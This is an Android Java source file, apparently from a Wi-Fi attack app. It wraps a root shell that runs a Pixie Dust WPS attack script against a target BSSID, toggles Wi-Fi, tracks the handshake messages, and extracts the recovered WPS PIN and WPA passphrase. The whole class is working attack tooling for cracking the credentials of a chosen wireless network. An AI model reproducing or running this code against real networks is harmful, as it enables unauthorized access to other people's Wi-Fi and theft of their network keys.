package com.opx.yourdemon.wifi.utils;


import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.text.Html;
import android.text.Spanned;
import android.util.Log;
import android.widget.TextView;

import com.opx.yourdemon.custom.WiFINetwork;
import com.opx.yourdemon.utils.Core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.function.Consumer;

public class PixieDust {
    @SuppressLint("StaticFieldLeak")
    public final TextView output;
    public String exec = Core.EXECUTE;
    public Process process;
    @SuppressLint("StaticFieldLeak")
    public Context mContext;
    @SuppressLint("StaticFieldLeak")
    public Activity mActivity;
    public String bssid;
    public String wifi_name;
    public Core core;
    public boolean killed = false;

    public PixieDust(Context context, Activity activity, final TextView out, String bssid1, String wifi_name1, Core c) {
        mContext = context;
        mActivity = activity;
        output = out;
        bssid = bssid1;
        wifi_name = wifi_name1;
        core = c;
    }

    public WiFINetwork execute(Consumer<String> progressCallback) {
        String line;
        WiFINetwork issuccess = new WiFINetwork();
        try {
            process = Runtime.getRuntime().exec("su");
            OutputStream stdin = process.getOutputStream();
            InputStream stderr = process.getErrorStream();
            InputStream stdout = process.getInputStream();

            String cmd = "timeout 45 python3 -u /CORE/PixieWps/pixie.py -i " + core.getString("wlan_scan") + " --iface-down -K -F -b " + bssid;
            if (core.getBoolean("pixie_off")) {
                cmd = "timeout 45 python3 -u /CORE/PixieWps/pixie.py -i " + core.getString("wlan_scan") + " -K -F -b " + bssid;
                stdin.write((exec + " '" + cmd + "'" + " &&echo PIXIEFINISHED" + '\n').getBytes());
            } else {
                stdin.write(("svc wifi disable&&sleep 2&&" + exec + " '" + cmd + "'" + " &&echo PIXIEFINISHED&&sleep 2&&svc wifi enable" + '\n').getBytes());
            }
            stdin.write(("exit\n").getBytes());
            stdin.flush();
            stdin.close();
            ArrayList<String> out2 = new ArrayList<>();
            ArrayList<String> outerror = new ArrayList<>();
            BufferedReader br = new BufferedReader(new InputStreamReader(stdout));
            int countaperror = 0;
            while ((line = br.readLine()) != null) {
                out2.add(line);
                handleProgress(line);
                if (progressCallback != null) progressCallback.accept(line);
                if (line.contains("Associated")) {
                    countaperror++;
                } else {
                    countaperror = 0;
                }
                if (countaperror > 5) {
                    process.destroy();
                }
            }
            br.close();
            br = new BufferedReader(new InputStreamReader(stderr));
            while ((line = br.readLine()) != null) {
                handleProgress(line);
                if (progressCallback != null) progressCallback.accept(line);
                outerror.add(line);
            }
            br.close();
            process.waitFor();
            process.destroy();
            issuccess = pixie(out2);
        } catch (IOException e) {
            Log.d("Debug: ", "An IOException was caught: " + e.getMessage());
        } catch (InterruptedException ex) {
            Log.d("Debug: ", "An InterruptedException was caught: " + ex.getMessage());
        }
        if (killed) {
            issuccess.setCanceled(true);
        }
        return issuccess;
    }

    public void kill() {
        killed = true;
        process.destroy();
    }

    private void handleProgress(String line) {
        if (line.contains("Trying pin")) {
            settext(white(core.str("send_pin")), output);
        } else if (line.contains("Associated")) {
            settext(green(core.str("target_locked")), output);
        } else if (line.contains("Message M1")) {
            settext(green(core.str("m1")), output);
        } else if (line.contains("Message M2")) {
            settext(green(core.str("m2")), output);
        } else if (line.contains("E-Nonce")) {
            settext(white(core.str("enon")), output);
        } else if (line.contains("PKR: ")) {
            settext(green(core.str("pkr")), output);
        } else if (line.contains("PKE: ")) {
            settext(green(core.str("pke")), output);
        } else if (line.contains("AuthKey: ")) {
            settext(green(core.str("authkey")), output);
        } else if (line.contains("Message M4 ")) {
            settext(white(core.str("m4")), output);
        } else if (line.contains("[+] WPS pin: ")) {
            settext(green(core.str("wps_pin") + line.replace("[+] WPS pin: ", "")), output);
        }
    }

    public void settext(Spanned text, TextView textView) {
        mActivity.runOnUiThread(() -> {
            textView.setText(text.toString());
        });
    }

    public WiFINetwork pixie(ArrayList<String> out) {
        String pin;
        String pass;
        WiFINetwork back = new WiFINetwork();
        for (int i = 0; i < out.size(); i++) {
            String s = out.get(i);
            if (s.contains("[+] WPS PIN:")) {
                pin = s.replace("[+] WPS PIN: ", "").replaceAll("'", "");
                back.setPin(pin);
                back.setOK(true);
            } else if (s.contains("[+] WPA PSK:")) {
                pass = s.replace("[+] WPA PSK: ", "").replaceAll("'", "");
                back.setPsk(pass);
                back.setOK(true);
            } else if (s.contains("Terminated")) {
                back.setOK(false);
            }
        }
        if (out.isEmpty()) {
            back.setLon("ERROR");
        }
        return back;
    }

    public Spanned green(String out) {
        return Html.fromHtml("<font color='#19D121'>" + out + "</font>");
    }

    public Spanned white(String out) {
        return Html.fromHtml("<font color='#FFFFFF'>" + out + "</font>");
    }
}
